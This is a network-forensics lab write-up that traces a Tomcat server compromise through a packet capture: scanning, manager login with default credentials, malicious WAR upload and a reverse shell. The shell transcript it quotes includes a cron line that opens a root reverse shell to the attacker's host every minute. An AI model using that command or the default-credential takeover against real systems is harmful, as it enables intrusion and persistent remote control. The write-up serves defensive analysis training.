How I handled the case

I started broad instead of jumping straight to Tomcat. First I checked the capture timeframe, protocol distribution and active hosts. Once 14.0.0.120 appeared as an unusual external-looking IP talking to the Tomcat server, I used it as my main pivot.

The traffic showed a clear sequence: scanning, open port discovery, Gobuster enumeration, Basic Auth attempts, a successful Tomcat Manager login using admin:tomcat, upload of JXQOZY.war, deployed web path access, and later a reverse shell running as root.

Working conclusion: I considered the host compromised after the WAR upload was followed by shell activity and cron persistence pointing back to 14.0.0.120:443. The important part was correlating the login, upload, deployment and callback traffic, not treating any single packet alone as the full story.

Protocol and host overview

The protocol hierarchy showed mostly TCP traffic, with HTTP and SSH standing out. Since the case was about a Tomcat server, I focused on HTTP traffic and Tomcat-related ports.

2. SMB background traffic

Before focusing on Tomcat, I checked early SMB traffic so I would not label every internal packet as malicious. This helped separate normal internal noise from the later Tomcat attack.

I also checked SMB object export. The file transfer looked like a normal PDF transfer and did not connect to the later Tomcat attack chain.

3. Identifying the Tomcat service

After triage, I looked for the web server. Access to 10.0.0.112:8080 showed an Apache Tomcat landing page. That confirmed the victim host and the service version visible in the capture.

At this point I had the likely victim: 10.0.0.112. The next question was who was interacting with it in a suspicious way.

4. Reconnaissance and open port discovery

I pivoted to 14.0.0.120 because it stood out from the internal address range. The traffic showed repeated SYN packets to many ports on 10.0.0.112, which looked like a TCP SYN scan.

ip.src == 14.0.0.120 && tcp.flags.syn == 1 && tcp.flags.ack == 0

To identify open ports, I filtered for SYN/ACK responses from the Tomcat host back to the scanner.

ip.src == 10.0.0.112 && ip.dst == 14.0.0.120 && tcp.flags == 0x0012

5. Tomcat Manager enumeration and credential access

After scanning, the attacker started probing Tomcat management paths. One request used User-Agent: gobuster/3.6 against /host-manager/html/*, and the server returned 401 Unauthorized. That told me the attacker had found a protected Tomcat management area.

I then checked Basic Auth attempts against /manager/html. Several requests failed with 401, which fit a credential guessing pattern.

One decoded credential was tomcat:s3cr3t, but the server still returned 401 Unauthorized. I did not treat it as valid because the response code matters as much as the decoded Authorization header.

The successful login used Authorization: Basic YWRtaW46dG9tY2F0, which decoded to admin:tomcat. This time the response was HTTP/1.1 200 OK and included a manager session cookie, so I treated it as confirmed access.

6. Malicious WAR upload and deployment

Once the attacker had a valid manager session, the next important event was a POST request to the Tomcat Manager upload endpoint. The request contained a multipart field named deployWar and the uploaded filename JXQOZY.war.

ip.addr == 14.0.0.120 && http.request.method == "POST"

A WAR file is a Java web application archive. In a Tomcat takeover, uploading a WAR is dangerous because the deployed application can contain a JSP web shell or code that gives command execution.

The attacker then accessed /JXQOZY/ and got 200 OK. That confirmed the WAR was deployed, not just uploaded.

7. Reverse shell, root context and cron persistence

Later in the capture, I noticed a TCP stream from the victim back to the attacker. Following the stream showed interactive command execution. The first key command was whoami, and the response was root.

whoami
root

cd /tmp
pwd
/tmp

echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'" > cron
crontab -i cron
crontab -l

* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
This was the strongest compromise evidence in the capture: shell access as root and a cron job that attempted to run a reverse shell to 14.0.0.120:443 every minute.

8. Attacker IP enrichment

I checked 14.0.0.120 with IP enrichment after confirming the behavior in the PCAP. The lookup placed the IP in Guangdong, China and associated it with ChinaNet Guangdong Province Network.

I used geolocation only as enrichment, not attribution. The reason 14.0.0.120 is important is packet behavior: scan, enumeration, authentication, WAR upload and callback traffic.

Lessons learned

This lab reinforced a practical network-forensics workflow: start broad, map hosts, identify services, then pivot into protocol-specific evidence. The most useful habit was checking HTTP response codes while decoding Basic Auth. A decoded credential alone is not proof of success; 401 means failed, while 200 OK plus a session cookie proves access.

The final chain was only clear after connecting several pieces together: scan traffic, Tomcat Manager access, WAR upload, deployed path access, reverse shell commands and cron persistence.
